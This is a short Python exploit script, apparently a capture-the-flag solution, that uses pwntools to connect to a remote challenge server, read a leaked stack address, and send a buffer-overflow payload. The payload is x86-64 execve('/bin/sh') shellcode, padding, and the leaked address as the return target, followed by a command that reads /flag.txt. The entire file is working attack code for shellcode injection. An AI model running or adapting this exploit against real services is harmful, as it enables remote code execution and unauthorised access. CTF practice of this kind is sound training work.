#!/usr/bin/env python3

from pwn import remote, process, p64, log

#p = process("./chall/app")
#pid = gdb.attach(p, gdbscript="""""")
p = remote("51.124.222.205", 13370)

p.recvuntil(b"at ")
leak = int(p.recvuntil(b".")[:-1], 16)
log.info(f"Leak: {hex(leak)}")

# http://shell-storm.org/input/files/input-603.php
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = shellcode + 14 * b"A" + 4 * b"B" + 8 * b"C" + p64(leak)
log.info(f"Shellcode length: {len(shellcode)}")
log.info(f"Payload ({len(payload)}): {payload}")

p.sendlineafter(b">", b"1")
p.sendlineafter(b">", payload)
p.sendline(b"cat /flag.txt")
print(p.recvline().replace(b'\n',b''))
#p.interactive()
